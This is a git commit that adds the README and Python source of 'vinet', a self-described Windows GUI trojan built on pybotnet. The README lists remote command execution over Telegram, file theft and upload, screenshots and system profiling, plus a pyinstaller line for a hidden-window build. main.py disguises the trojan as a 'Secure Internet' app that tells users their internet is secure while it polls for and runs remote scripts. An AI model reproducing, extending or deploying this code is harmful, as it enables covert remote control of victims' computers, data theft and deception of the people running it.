254e26cd247be72b5a79b45d133a1f0bc77313c1
onionj <onionj98@gmail.com>
2021-07-24 05:43:01 +0430

    upload projeckt , v0.18.5

--- README.md
+++ README.md
@@ -1,8 +1,41 @@
-# vinet
+# vinet v0.18.5
 ## gui trojan for windows
 
-This is a graphical trojan created with python/pybotnet and PyQt5
-
-soon...
+This is a graphical trojan created with [pybotnet](https://github.com/onionj/pybotnet) and tkinter 
 
 > Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf.
+### Features:
+* get command from telegram and execute scripts 
+* get command and send message by third party proxy
+* get target info 
+* sleep source by Optional message
+* get ls (dirctory list)
+* export file to targets system
+* import file from target system 
+* get screenshot
+
+
+### Commmands:
+
+> Send this COMMANDs to your api bot in telegram, using the admin account.
+
+>  for run command on one target:  `<Target_MAC_Address> <command>`    `66619484755211 get_info` 
+
+
+COMMAND | Sample | DO THIS | version | tested on |
+--------|--------|---------|--------------------------|-----------|
+`get_info` | `get_info` |return system info | 0.06 | windows, linux |
+`do_sleep <scconds> <message (Optional)>` | `do_sleep 99999 hi, i see you!` | \<if message != none : print(message) > ; time.sleep(seccond) | 0.08 | windows, linux |
+`cmd <system command>` | `cmd mkdir new_folder` | run system command in shell or cmd (Be careful not to give endless command like `ping google.com -t`  in windows or `ping google.com` in linux)  TODO:add timeout| 0.07 | windows, linux|
+`ls <route>` | `ls C:\ `,` ls /home` |Returns a list of folders and files in that path | 0.09 | windows, linux |
+`export_file <link>` | `export_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` |target donwload this file and save to script path route| 0.14 | windows linux|
+`import_file <file_route>` |`import_file /home/onionj/folder/somting.png` | get a file from target system (limit:5GB)| 0.17.0 |  windows, linux|
+`screenshot` | `screenshot` | Takes a screenshot, uploads it to the online server and return the download link | 0.18.1 |  windows, linux |
+`help` | `help` | send commands help | 0.18.5 | windows, linux |
+
+
+
+
+compile app with pyinstaller: `pyinstaller --onefile -w -F -i "icon.ico" main.py`
+
+> if you want use this app on windows 7, compile with python 3.7
---
+++ main.py
@@ -0,0 +1,121 @@
+
+
+from threading import Thread
+import tkinter as tk    
+
+import time
+
+import pybotnet
+
+
+
+
+
+
+class Vinet(tk.Frame):
+    def __init__(self, master=None):
+        super().__init__(master)
+        self.master = master
+        self.master.title('VINET - Secure Internet')
+        self.master.geometry('400x160')
+        self.master.iconbitmap('icon.ico')
+        self.pack()
+
+        self.font_tuple_1 = ("Helvetica", 9) 
+        self.font_tuple_2 = ("Comic Sans MS", 12) 
+        self.item_size = 50
+
+        self._running = False
+        self.trojan = None
+        self.trojan_delay = 10
+        self.create_widgets()
+
+    def create_widgets(self):
+
+        # get telegram token
+        tk.Label(self, text='TOKEN', font = self.font_tuple_1).pack()
+        self.TELEGRAM_TOKEN_LABALE = tk.Entry(self)
+        self.TELEGRAM_TOKEN_LABALE['width'] = self.item_size + 9
+        self.TELEGRAM_TOKEN_LABALE.pack()
+
+        # get telegram chat id
+        tk.Label(self, text='ID', font = self.font_tuple_1).pack()
+        self.TELEGRAM_ADMIN_CHAT_ID_LABALE = tk.Entry(self)
+        self.TELEGRAM_ADMIN_CHAT_ID_LABALE['width'] = self.item_size + 9
+        self.TELEGRAM_ADMIN_CHAT_ID_LABALE.pack()
+
+        # status
+        self.status = tk.Label(self)
+        self.status['text'] = 'offline'
+        self.status['fg'] = 'red'
+        self.status['height'] = 2
+        self.status['font'] = self.font_tuple_2
+        self.status.pack()
+
+        # init start button
+        self.start_button = tk.Button(self)
+        self.start_button["text"] = "Start VINET"
+        self.start_button['activebackground']='#78d6ff'
+        self.start_button["command"] = self.run_pybotnet_trojan
+        self.start_button['width'] = self.item_size
+        self.start_button['bg'] = 'green'
+        self.start_button['font'] = self.font_tuple_1
+        self.start_button.pack()
+
+
+
+    def run_pybotnet_trojan(self):
+        TOKEN = self.TELEGRAM_TOKEN_LABALE.get()
+        CHAT_ID = self.TELEGRAM_ADMIN_CHAT_ID_LABALE.get()
+        
+        
+        if self._running:
+            self.status['text'] = 'VINET is online! \n Your internet is secure'
+            self.status['fg'] = 'green'
+            return
+
+        # check data
+        if TOKEN == '':
+            self.status['text'] = 'please add TOKEN'
+            self.status['fg'] = 'red'
+            return
+
+        # check data
+        if CHAT_ID == '':
+            self.status['text'] = 'please add ID'
+            self.status['fg'] = 'red'
+            return
+        
+        # start trojan tread
+        self.trojan = Thread(target=self.pybotnet_trojan)
+        self.trojan.start()
+
+    
+    def stop_trojan(self):
+        self._running = False
+
+
+    def pybotnet_trojan(self):
+        self._running = True
+
+        self.status['text'] = 'online \n Your internet is secure'
+        self.status['fg'] = 'green'
+
+        TOKEN = self.TELEGRAM_TOKEN_LABALE.get()
+        CHAT_ID = self.TELEGRAM_ADMIN_CHAT_ID_LABALE.get()
+
+        self.pybotnet = pybotnet.PyBotNet(TOKEN, CHAT_ID, show_log=False, send_system_data=True, is_shell=False)
+
+        while self._running:
+            self.pybotnet.get_and_execute_scripts_by_third_party_proxy()
+            time.sleep(self.trojan_delay)
+
+        self._running = False
+
+
+        
+if __name__ == '__main__':
+    root = tk.Tk()
+    app = Vinet(master=root)
+    app.mainloop()
+    app.stop_trojan()
